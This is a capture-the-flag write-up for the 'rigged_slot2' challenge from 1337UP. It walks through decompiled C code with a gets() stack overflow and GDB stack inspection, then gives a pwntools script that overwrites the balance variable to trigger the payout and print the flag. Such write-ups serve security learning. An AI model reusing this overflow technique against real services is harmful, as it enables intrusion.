---
date: 
tier: easy
author: naibu3
ctf: 1337UP
---
# Overview

```
The casino fixed their slot machine algorithm - good luck hitting that jackpot now! 🤭
```

# Reconocimiento

```bash
file rigged_slot2
```
```
rigged_slot2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dece9a0713cfebb8eb0f9006fd3f54ad2fb992a0, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=rigged_slot2
```
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

```c
void main(void)

{
  time_t time;
  int bet;
  undefined input [20];
  uint money;
  int money_input;
  __gid_t group_id;
  
  setvbuf(stdout,(char *)0x0,2,0);
  group_id = getegid();
  setresgid(group_id,group_id,group_id);
  time = ::time((time_t *)0x0);
  srand((uint)time);
  setup_alarm(5);
  money = 100;
  puts("Welcome to the Rigged Slot Machine!");
  puts("You start with $100. Can you beat the odds?");
  enter_name(input);
  do {
    while( true ) {
      while( true ) {
        bet = 0;
        printf("\nEnter your bet amount (up to $%d per spin): ",100);
        money_input = __isoc99_scanf(&DAT_0010224e,&bet);
        if (money_input == 1) break;
        puts("Invalid input! Please enter a numeric value.");
        clear_input();
      }
      if ((bet < 1) || (100 < bet)) break;
      if ((int)money < bet) {
        printf("You cannot bet more than your Current Balance: $%d\n",(ulong)money);
      }
      else {
        play(bet,&money);
        if (money == 1337420) {
          payout(&money);
        }
      }
    }
    printf("Invalid bet amount! Please bet an amount between $1 and $%d.\n",100);
  } while( true );
}
```

```c
void play(int bet,uint *param_2)

{
  int random;
  int factor;
  uint balance;
  
  random = rand();
  random = random % 1000;
  if (random == 0) {
    factor = 10;
  }
  else if (random < 5) {
    factor = 5;
  }
  else if (random < 10) {
    factor = 3;
  }
  else if (random < 0xf) {
    factor = 2;
  }
  else if (random < 0x1e) {
    factor = 1;
  }
  else {
    factor = 0;
  }
  balance = bet * factor - bet;
  if ((int)balance < 1) {
    if ((int)balance < 0) {
      printf("You lost $%d.\n",(ulong)-balance);
    }
    else {
      puts("No win, no loss this time.");
    }
  }
  else {
    printf("You won $%d!\n",(ulong)balance);
  }
  *param_2 = *param_2 + balance;
  printf("Current Balance: $%d\n",(ulong)*param_2);
  if ((int)*param_2 < 1) {
    puts("You\'re out of money! Game over!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```

```c
void payout(int *param_1)

{
  char flag [72];
  FILE *flag_fd;

  if (*param_1 != 0x14684c) { //0x14684c -> 1337420
    puts("You can\'t withdraw money until you win the jackpot!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  flag_fd = fopen("flag.txt","r");
  if (flag_fd == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(flag,0x40,flag_fd);
  printf("Congratulations! You\'ve won the jackpot! Here is your flag: %s\n",flag);
  fclose(flag_fd);
  return;
}
```

```c
void enter_name(char *param_1) {
  puts("Enter your name:");
  gets(param_1);
  printf("Welcome, %s!\n",param_1);
  return;
}
```

```
AAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD
```

```
gdb-peda$ telescope 10
0000| 0x7fffffffdbc8 --> 0x55555555563a (<main+336>:	mov    eax,DWORD PTR [rbp-0xc])
0008| 0x7fffffffdbd0 --> 0x0 
0016| 0x7fffffffdbd8 --> 0x100000000 
0024| 0x7fffffffdbe0 ('A' <repeats 20 times>, "BBBB\001")
0032| 0x7fffffffdbe8 ('A' <repeats 12 times>, "BBBB\001")
0040| 0x7fffffffdbf0 ("AAAABBBB\001")
0048| 0x7fffffffdbf8 --> 0x4343434300000001 
0056| 0x7fffffffdc00 ("CCCCDDDDDDDD")
0064| 0x7fffffffdc08 --> 0x7f0044444444 
0072| 0x7fffffffdc10 --> 0x7fffffffdd00 --> 0x7fffffffdd08 --> 0x38 ('8')
```
# Explotación

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

exe = context.binary = ELF(args.EXE or 'rigged_slot2')


def start():

    if args.REMOTE:
        return remote("riggedslot2.ctf.intigriti.io", 1337)
    else:
        return process('./rigged_slot2')

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

offset=20

io = start()

io.recvuntil("Enter your name:")

payload = offset*b'A'
payload += p64(1337421)

io.sendline(payload)

io.recvuntil("Enter your bet amount (up to $100 per spin):")

io.sendline("1")

io.interactive()
```

```
 You lost $1.
Current Balance: $1337420
Congratulations! You've won the jackpot! Here is your flag: INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}
```